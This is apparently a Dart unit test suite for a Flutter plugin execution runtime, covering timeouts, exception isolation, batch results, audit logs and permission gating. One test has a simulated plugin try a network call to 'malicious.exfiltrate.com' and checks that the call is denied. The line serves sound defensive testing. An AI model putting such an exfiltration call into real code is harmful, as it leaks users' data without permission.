import 'dart:async';
import 'package:flutter_package_studio_core/flutter_package_studio_core.dart';
import 'package:test/test.dart';

class SampleAnalysisContribution implements PackageAnalysisContribution {
  @override
  List<String> getAnalyzers() => ['analyzer_alpha', 'analyzer_beta'];
}

class ThrowingAnalysisContribution implements PackageAnalysisContribution {
  @override
  List<String> getAnalyzers() {
    throw StateError('Intentional analysis explosion!');
  }
}

class SampleCommandContribution implements CommandContribution {
  @override
  List<String> getCommands() => ['custom_cmd'];
}

class SampleGitReleaseContribution implements ReleaseWorkflowContribution {
  @override
  List<String> getWorkflowHooks() => ['git_hook_1'];
}

void main() {
  group('PluginExecutionRuntime Tests (Phase 7.9)', () {
    late PluginPermissionGate permissionGate;
    late PluginLifecycleManager lifecycleManager;
    late PluginRegistry registry;
    late PluginExecutionRuntime runtime;

    late PluginManifest manifestA;
    late PluginManifest manifestB;
    late PluginManifest manifestC;

    setUp(() async {
      permissionGate = PluginPermissionGate();
      registry = PluginRegistry();
      lifecycleManager = PluginLifecycleManager(
        permissionGate: permissionGate,
        registry: registry,
      );
      runtime = PluginExecutionRuntime(
        lifecycleManager: lifecycleManager,
        permissionGate: permissionGate,
        registry: registry,
        maxConsecutiveFailures: 3,
      );

      // Setup Plugin A (Healthy)
      manifestA = PluginManifest(
        id: PluginId('plugin_a'),
        name: PluginName('PluginA'),
        description: PluginDescription('Plugin A'),
        version: SemVer.parse('1.0.0'),
        author: const PluginAuthor(name: 'Dev'),
        apiVersion: '1.0.0',
        capabilities: {PluginCapability.packageAnalysisContribution},
        compatibility: PluginCompatibility(minApiVersion: '1.0.0'),
        securityRequirements: const SecurityRequirements(
          permissions: ['package.read'],
        ),
      );

      // Setup Plugin B (Throwing/Failing)
      manifestB = PluginManifest(
        id: PluginId('plugin_b'),
        name: PluginName('PluginB'),
        description: PluginDescription('Plugin B'),
        version: SemVer.parse('1.0.0'),
        author: const PluginAuthor(name: 'Dev'),
        apiVersion: '1.0.0',
        capabilities: {PluginCapability.packageAnalysisContribution},
        compatibility: PluginCompatibility(minApiVersion: '1.0.0'),
        securityRequirements: const SecurityRequirements(
          permissions: ['package.read'],
        ),
      );

      // Setup Plugin C (Healthy)
      manifestC = PluginManifest(
        id: PluginId('plugin_c'),
        name: PluginName('PluginC'),
        description: PluginDescription('Plugin C'),
        version: SemVer.parse('1.0.0'),
        author: const PluginAuthor(name: 'Dev'),
        apiVersion: '1.0.0',
        capabilities: {PluginCapability.packageAnalysisContribution},
        compatibility: PluginCompatibility(minApiVersion: '1.0.0'),
        securityRequirements: const SecurityRequirements(
          permissions: ['package.read'],
        ),
      );

      // Approve permissions
      permissionGate.approvePermission(
          'plugin_a', PluginPermission.packageRead);
      permissionGate.approvePermission(
          'plugin_b', PluginPermission.packageRead);
      permissionGate.approvePermission(
          'plugin_c', PluginPermission.packageRead);

      // Track and transition A to active
      lifecycleManager.trackInstance(
        instanceId: 'inst_a',
        manifest: manifestA,
        instance: SampleAnalysisContribution(),
      );
      await lifecycleManager.transitionTo(
          instanceId: 'inst_a', targetState: PluginLifecycleState.validated);
      await lifecycleManager.transitionTo(
          instanceId: 'inst_a', targetState: PluginLifecycleState.registered);
      await lifecycleManager.transitionTo(
          instanceId: 'inst_a', targetState: PluginLifecycleState.initialized);
      await lifecycleManager.transitionTo(
          instanceId: 'inst_a', targetState: PluginLifecycleState.active);

      // Track and transition B to active
      lifecycleManager.trackInstance(
        instanceId: 'inst_b',
        manifest: manifestB,
        instance: ThrowingAnalysisContribution(),
      );
      await lifecycleManager.transitionTo(
          instanceId: 'inst_b', targetState: PluginLifecycleState.validated);
      await lifecycleManager.transitionTo(
          instanceId: 'inst_b', targetState: PluginLifecycleState.registered);
      await lifecycleManager.transitionTo(
          instanceId: 'inst_b', targetState: PluginLifecycleState.initialized);
      await lifecycleManager.transitionTo(
          instanceId: 'inst_b', targetState: PluginLifecycleState.active);

      // Track and transition C to active
      lifecycleManager.trackInstance(
        instanceId: 'inst_c',
        manifest: manifestC,
        instance: SampleAnalysisContribution(),
      );
      await lifecycleManager.transitionTo(
          instanceId: 'inst_c', targetState: PluginLifecycleState.validated);
      await lifecycleManager.transitionTo(
          instanceId: 'inst_c', targetState: PluginLifecycleState.registered);
      await lifecycleManager.transitionTo(
          instanceId: 'inst_c', targetState: PluginLifecycleState.initialized);
      await lifecycleManager.transitionTo(
          instanceId: 'inst_c', targetState: PluginLifecycleState.active);
    });

    test('1. Happy-path single-plugin execution test', () async {
      final result = await runtime.executePackageAnalysis(instanceId: 'inst_a');

      expect(result.isSuccess, isTrue);
      expect(result.status, equals(PluginExecutionStatus.success));
      expect(result.pluginId, equals('plugin_a'));
      expect(result.value, equals(['analyzer_alpha', 'analyzer_beta']));
      expect(result.errorMessage, isNull);
      expect(result.durationMs, greaterThanOrEqualTo(0));
    });

    test('2. Roadmap three-plugin batch test (A succeeds, B fails, C succeeds)',
        () async {
      final batchResult = await runtime.executeBatch<List<String>>(
        instanceIds: ['inst_a', 'inst_b', 'inst_c'],
        capabilityName: 'packageAnalysis',
        action: (instId, ctx) => ctx.analysisContribution!.getAnalyzers(),
      );

      expect(batchResult.totalCount, equals(3));
      expect(batchResult.successCount, equals(2));
      expect(batchResult.failureCount, equals(1));
      expect(batchResult.timeoutCount, equals(0));

      final resA = batchResult.results[0];
      final resB = batchResult.results[1];
      final resC = batchResult.results[2];

      expect(resA.pluginId, equals('plugin_a'));
      expect(resA.status, equals(PluginExecutionStatus.success));
      expect(resA.value, equals(['analyzer_alpha', 'analyzer_beta']));

      expect(resB.pluginId, equals('plugin_b'));
      expect(resB.status, equals(PluginExecutionStatus.failed));
      expect(resB.errorMessage, contains('Intentional analysis explosion!'));

      expect(resC.pluginId, equals('plugin_c'));
      expect(resC.status, equals(PluginExecutionStatus.success));
      expect(resC.value, equals(['analyzer_alpha', 'analyzer_beta']));
    });

    test(
        '3. Exception-isolation test: unhandled exception does not crash runtime',
        () async {
      final result = await runtime.executePackageAnalysis(instanceId: 'inst_b');

      expect(result.isSuccess, isFalse);
      expect(result.status, equals(PluginExecutionStatus.failed));
      expect(result.errorMessage, contains('Intentional analysis explosion!'));
      expect(result.stackTrace, isNotNull);
    });

    test(
        '4. Timeout test: plugin exceeding duration returns timedOut status without hanging',
        () async {
      final result = await runtime.executeContribution<String>(
        instanceId: 'inst_a',
        operation: 'slow_op',
        timeout: const Duration(milliseconds: 50),
        action: (ctx) async {
          await Future.delayed(const Duration(milliseconds: 300));
          return 'completed_too_late';
        },
      );

      expect(result.isSuccess, isFalse);
      expect(result.status, equals(PluginExecutionStatus.timedOut));
      expect(result.errorMessage, contains('timed out'));
    });

    test(
        '4b. Abandoned-future tail absorption test: late background error after timeout is safely absorbed without crashing zone or corrupting state',
        () async {
      final lateCompleter = Completer<void>();

      // Execute slow plugin that throws AFTER timeout has already resolved
      final result = await runtime.executeContribution<String>(
        instanceId: 'inst_a',
        operation: 'late_throwing_op',
        timeout: const Duration(milliseconds: 40),
        action: (ctx) async {
          await Future.delayed(const Duration(milliseconds: 100));
          lateCompleter.complete();
          throw StateError(
              'Delayed post-timeout explosion from abandoned future!');
        },
      );

      // Verify caller immediately receives timedOut status
      expect(result.isSuccess, isFalse);
      expect(result.status, equals(PluginExecutionStatus.timedOut));

      // Wait for the background abandoned future to actually fire its exception
      await lateCompleter.future;
      await Future.delayed(const Duration(milliseconds: 50));

      // Assert that subsequent executions on the runtime continue to succeed normally
      final followUpResult =
          await runtime.executePackageAnalysis(instanceId: 'inst_c');
      expect(followUpResult.isSuccess, isTrue);
      expect(followUpResult.status, equals(PluginExecutionStatus.success));
      expect(followUpResult.value, equals(['analyzer_alpha', 'analyzer_beta']));

      // Assert audit log was not corrupted
      expect(runtime.auditLog.last.pluginId, equals('plugin_c'));
      expect(
          runtime.auditLog.last.status, equals(PluginExecutionStatus.success));
    });

    test(
        '5. Context-scoping test: context refuses unapproved operations via permission gate',
        () async {
      final result = await runtime.executeContribution<String>(
        instanceId: 'inst_a',
        operation: 'network_call',
        action: (ctx) async {
          // Plugin A has only package.read declared and approved, NOT network.access
          return await ctx.networkProxy.executeNetworkCall(
            uri: 'https://malicious.exfiltrate.com',
            action: () async => 'exfiltrated',
          );
        },
      );

      expect(result.isSuccess, isFalse);
      expect(result.status, equals(PluginExecutionStatus.permissionDenied));
      expect(result.errorMessage, contains('network.access'));
    });

    test(
        '6. Not-Active plugin rejection test: runtime refuses execution for non-active plugins',
        () async {
      final manifestD = PluginManifest(
        id: PluginId('plugin_d'),
        name: PluginName('PluginD'),
        description: PluginDescription('Plugin D'),
        version: SemVer.parse('1.0.0'),
        author: const PluginAuthor(name: 'Dev'),
        apiVersion: '1.0.0',
        capabilities: {PluginCapability.packageAnalysisContribution},
        compatibility: PluginCompatibility(minApiVersion: '1.0.0'),
        securityRequirements: const SecurityRequirements(
          permissions: ['package.read'],
        ),
      );

      permissionGate.approvePermission(
          'plugin_d', PluginPermission.packageRead);
      lifecycleManager.trackInstance(instanceId: 'inst_d', manifest: manifestD);
      await lifecycleManager.transitionTo(
          instanceId: 'inst_d', targetState: PluginLifecycleState.validated);

      // inst_d is only in `validated` state, not `active`
      final result = await runtime.executePackageAnalysis(instanceId: 'inst_d');

      expect(result.isSuccess, isFalse);
      expect(result.status, equals(PluginExecutionStatus.rejectedNotActive));
      expect(result.errorMessage, contains('expected "active"'));
    });

    test(
        '7. Permission-gate-not-bypassed test: execution calls through checked proxy',
        () async {
      // Create plugin E with no approved permission
      final manifestE = PluginManifest(
        id: PluginId('plugin_e'),
        name: PluginName('PluginE'),
        description: PluginDescription('Plugin E'),
        version: SemVer.parse('1.0.0'),
        author: const PluginAuthor(name: 'Dev'),
        apiVersion: '1.0.0',
        capabilities: {PluginCapability.packageAnalysisContribution},
        compatibility: PluginCompatibility(minApiVersion: '1.0.0'),
        securityRequirements: const SecurityRequirements(
          permissions: ['package.read'],
        ),
      );

      // DO NOT approve permission for plugin_e in gate!
      // Bypass lifecycle check by mocking instance directly
      lifecycleManager.trackInstance(
        instanceId: 'inst_e',
        manifest: manifestE,
        instance: SampleAnalysisContribution(),
      );

      // Use internal transition to validated
      await lifecycleManager.transitionTo(
          instanceId: 'inst_e', targetState: PluginLifecycleState.validated);

      // Revoke approval just in case
      permissionGate.revokePermission('plugin_e', PluginPermission.packageRead);

      final result = await runtime.executeContribution<List<String>>(
        instanceId: 'inst_a',
        operation: 'unapproved_proxy_call',
        action: (ctx) {
          // Wrap unapproved manifest with CheckedPackageAnalysisContribution
          final proxy = CheckedPackageAnalysisContribution(
            delegate: SampleAnalysisContribution(),
            manifest: manifestE,
            gate: permissionGate,
          );
          return proxy.getAnalyzers();
        },
      );

      expect(result.isSuccess, isFalse);
      expect(result.status, equals(PluginExecutionStatus.permissionDenied));
      expect(result.errorMessage, contains('DENIED'));
    });

    test(
        '8. Result-aggregation-integrity test: large batch preserves all entries with zero drops',
        () async {
      final batchIds = <String>[];
      for (var i = 0; i < 25; i++) {
        final id = 'plugin_batch_$i';
        final instId = 'inst_batch_$i';
        final manifest = PluginManifest(
          id: PluginId(id),
          name: PluginName('Batch $i'),
          description: PluginDescription('Desc'),
          version: SemVer.parse('1.0.0'),
          author: const PluginAuthor(name: 'Dev'),
          apiVersion: '1.0.0',
          capabilities: {PluginCapability.packageAnalysisContribution},
          compatibility: PluginCompatibility(minApiVersion: '1.0.0'),
          securityRequirements: const SecurityRequirements(
            permissions: ['package.read'],
          ),
        );
        permissionGate.approvePermission(id, PluginPermission.packageRead);
        lifecycleManager.trackInstance(
          instanceId: instId,
          manifest: manifest,
          instance: (i % 5 == 0)
              ? ThrowingAnalysisContribution()
              : SampleAnalysisContribution(),
        );
        await lifecycleManager.transitionTo(
            instanceId: instId, targetState: PluginLifecycleState.validated);
        await lifecycleManager.transitionTo(
            instanceId: instId, targetState: PluginLifecycleState.registered);
        await lifecycleManager.transitionTo(
            instanceId: instId, targetState: PluginLifecycleState.initialized);
        await lifecycleManager.transitionTo(
            instanceId: instId, targetState: PluginLifecycleState.active);
        batchIds.add(instId);
      }

      final batchResult = await runtime.executeBatch<List<String>>(
        instanceIds: batchIds,
        capabilityName: 'packageAnalysis',
        action: (instId, ctx) => ctx.analysisContribution!.getAnalyzers(),
      );

      expect(batchResult.totalCount, equals(25));
      expect(batchResult.failureCount, equals(5)); // i = 0, 5, 10, 15, 20
      expect(batchResult.successCount, equals(20));
      expect(batchResult.results.length, equals(25));
    });

    test(
        '9. Audit test: every invocation produces a specific timestamped record',
        () async {
      await runtime.executePackageAnalysis(instanceId: 'inst_a');
      await runtime.executePackageAnalysis(instanceId: 'inst_b');

      expect(runtime.auditLog.length, greaterThanOrEqualTo(2));
      final recA = runtime.auditLog[runtime.auditLog.length - 2];
      final recB = runtime.auditLog[runtime.auditLog.length - 1];

      expect(recA.pluginId, equals('plugin_a'));
      expect(recA.status, equals(PluginExecutionStatus.success));
      expect(
          recA.operation, equals('PackageAnalysisContribution.getAnalyzers'));

      expect(recB.pluginId, equals('plugin_b'));
      expect(recB.status, equals(PluginExecutionStatus.failed));
    });

    test(
        '10. Repeated-failure lifecycle-routing test: exceeding failure threshold auto-disables plugin',
        () async {
      // Execute inst_b 3 consecutive times to hit maxConsecutiveFailures (3)
      await runtime.executePackageAnalysis(instanceId: 'inst_b');
      await runtime.executePackageAnalysis(instanceId: 'inst_b');
      await runtime.executePackageAnalysis(instanceId: 'inst_b');

      final record = lifecycleManager.getInstance('inst_b');
      expect(record!.state, equals(PluginLifecycleState.disabled));
      expect(record.history.last.reason, contains('Auto-disabled by runtime'));
    });

    test(
        '11a. Fail-closed edge-case: invoking unknown/untracked plugin instance returns failure',
        () async {
      final result = await runtime.executePackageAnalysis(
          instanceId: 'unknown_instance_id');

      expect(result.isSuccess, isFalse);
      expect(result.status, equals(PluginExecutionStatus.failed));
      expect(result.errorMessage, contains('not tracked'));
    });

    test(
        '11b. Fail-closed edge-case: invoking contribution type not provided returns failure',
        () async {
      // inst_a only provides packageAnalysisContribution, not commandContribution
      final result =
          await runtime.executeCommandContribution(instanceId: 'inst_a');

      expect(result.isSuccess, isFalse);
      expect(result.status, equals(PluginExecutionStatus.failed));
      expect(result.errorMessage,
          contains('does not implement CommandContribution'));
    });

    test(
        '11c. Fail-closed edge-case: unexpected or malformed execution returns failure result',
        () async {
      final result = await runtime.executeContribution<int>(
        instanceId: 'inst_a',
        operation: 'bad_type_op',
        action: (ctx) {
          throw FormatException('Malformed payload format');
        },
      );

      expect(result.isSuccess, isFalse);
      expect(result.status, equals(PluginExecutionStatus.failed));
      expect(result.errorMessage, contains('Malformed payload format'));
    });
  });
}
